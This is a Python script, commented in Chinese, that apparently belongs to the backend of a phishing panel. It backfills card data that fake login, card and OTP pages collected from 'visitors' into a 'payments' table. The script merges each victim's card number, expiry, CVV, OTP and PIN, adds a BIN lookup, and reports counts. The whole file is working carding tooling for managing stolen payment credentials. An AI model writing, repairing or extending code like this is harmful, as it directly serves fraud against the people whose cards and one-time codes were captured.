#!/usr/bin/env python3
"""回填订单：把 visitors.data 里已采集、但当时没解析出来的卡料补写进 payments。

背景
----
extract_card_values 以前只认字段名里含 card / カード / pan 的输入框。
日本站的 input name 经常是「_例__0123_4567_8910_1234」这种提示文字，
于是 checkoutPage 的卡号虽然采到了（存在 visitors.data 里），却没进 payments，
订单列表里卡号 / 有效期 / CVV 全是 "-"。

解析器已经改成按值识别（13~19 位 + Luhn），这个脚本负责把历史记录补齐。

用法
----
    # 先看会改哪些，不写库
    GATEWAY_DATA_DIR=/var/lib/gateway-console python3 tools/backfill_payments.py

    # 确认无误后写入
    GATEWAY_DATA_DIR=/var/lib/gateway-console python3 tools/backfill_payments.py --apply

脚本是幂等的：payments 里已有该 uuid 的记录就更新，没有才插入。
"""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import app  # noqa: E402


def merged_cards(steps: dict) -> dict:
    """把一个访客所有步骤的字段摊开，取最完整的一组卡料。

    同一访客可能提交多次（登录页、卡页、OTP 页）。含卡号的那一步优先级最高，
    其他步骤只用来补空缺字段。
    """
    merged: dict[str, str] = {}
    best: dict[str, str] = {}
    for fields in steps.values():
        if not isinstance(fields, dict):
            continue
        found = app.extract_card_values(fields)
        if not found:
            continue
        if found.get("ccard"):
            best = found
        else:
            for key, value in found.items():
                merged.setdefault(key, value)
    merged.update(best)
    return merged


def main() -> int:
    ap = argparse.ArgumentParser(description="把已采集的卡料回填进 payments")
    ap.add_argument("--apply", action="store_true", help="真正写库（默认只打印）")
    args = ap.parse_args()

    store = app.STORE
    with store.connect() as db:
        rows = db.execute(
            "SELECT id,uuid,site_abbreviation,referer,ip,data FROM visitors ORDER BY id"
        ).fetchall()

    print(f"扫描 {len(rows)} 条访客记录" + ("" if args.apply else "（预演，不写库）"))
    filled = skipped = empty = 0
    for row in rows:
        try:
            steps = json.loads(row["data"] or "{}")
        except (TypeError, ValueError):
            steps = {}
        if not isinstance(steps, dict) or not steps:
            empty += 1
            continue

        values = merged_cards(steps)
        if not values:
            skipped += 1
            continue

        uuid = row["uuid"]
        existing = store.payment_latest(uuid)
        if not values.get("ccard"):
            # 没有卡号时只补已有订单的零散字段（OTP / PIN 之类）
            if not existing:
                skipped += 1
                continue

        target = f"payments#{existing['id']}" if existing else "payments(new)"
        fields = ", ".join(f"{k}={v}" for k, v in sorted(values.items()))
        print(f"  [{row['id']:>4}] {uuid:32.32} {row['site_abbreviation'] or '-':22} -> {target}")
        print(f"         {fields}")
        filled += 1

        if not args.apply:
            continue

        if values.get("ccard"):
            values.update(store.bin_lookup(values["ccard"]))
        if existing:
            store.payment_update(existing["id"], values)
        else:
            store.payment_add(
                uid=row["id"], uuid=uuid, site=row["site_abbreviation"] or "",
                values=values, referer=row["referer"] or "", ip=row["ip"] or "",
            )

    print(f"\n可回填 {filled} 条，无可识别卡料 {skipped} 条，空 data {empty} 条")
    if not args.apply and filled:
        print("加 --apply 写入数据库")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
